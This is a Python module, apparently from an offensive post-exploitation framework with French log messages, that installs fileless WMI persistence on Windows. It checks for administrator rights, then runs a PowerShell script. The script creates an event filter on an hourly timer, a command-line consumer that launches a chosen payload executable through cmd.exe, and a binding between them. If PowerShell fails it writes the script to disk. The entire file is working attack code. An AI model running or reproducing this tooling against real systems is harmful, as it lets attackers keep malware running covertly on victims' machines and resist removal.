import os
import shutil
import subprocess
import sys

from core.logger import Logger
from core.module_interface import ModuleInterface

logger = Logger()


class WMIPersistence(ModuleInterface):
    def get_metadata(self):
        return {"name": "WMI Fileless Persistence", "version": "2.0", "type": "persistence"}

    def run(self, config):
        payload_path = config.get("payload_path", "C:\\payload.exe")
        if not os.path.exists(payload_path):
            logger.error("Payload introuvable")
            return {"status": "error", "message": "Payload not found"}

        if sys.platform == 'win32':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    logger.error("L'installation WMI nécessite des privilèges administrateur")
                    return {"status": "error", "message": "Admin rights required"}
            except Exception:
                pass

        powershell_cmd = None
        for candidate in ("powershell", "pwsh"):
            if shutil.which(candidate):
                powershell_cmd = candidate
                break

        ps_script = f'''
$filterArgs = @{{Name='MyFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __IntervalTimerEvent WHERE TimerID='MyTimer' AND IntervalBetweenFirings=3600000"}}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $filterArgs
$consumerArgs = @{{Name='MyConsumer'; CommandLineTemplate='"{payload_path}"'; ExecutablePath="cmd.exe"}}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $consumerArgs
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{{Filter=$filter; Consumer=$consumer}}
'''

        if not powershell_cmd:
            script_path = "wmi_persistence_stub.ps1"
            with open(script_path, "w", encoding='utf-8') as f:
                f.write(ps_script)
            logger.info("Script WMI généré en mode POC", script=script_path)
            return {
                "status": "success",
                "method": "WMI POC",
                "script_path": script_path,
                "note": "PowerShell non disponible sur cette machine ; un script de démonstration a été généré."
            }

        try:
            subprocess.run([powershell_cmd, "-Command", ps_script], capture_output=True, check=True)
            logger.info("Persistance WMI installée", payload=payload_path)
            return {"status": "success", "method": "WMI"}
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            logger.error("Échec de l'installation WMI", error=str(e))
            script_path = "wmi_persistence_stub.ps1"
            with open(script_path, "w", encoding='utf-8') as f:
                f.write(ps_script)
            return {
                "status": "success",
                "method": "WMI POC",
                "script_path": script_path,
                "note": "Exécution WMI impossible sur cette machine, script généré en dépôt local."
            }


__all__ = ["WMIPersistence"]
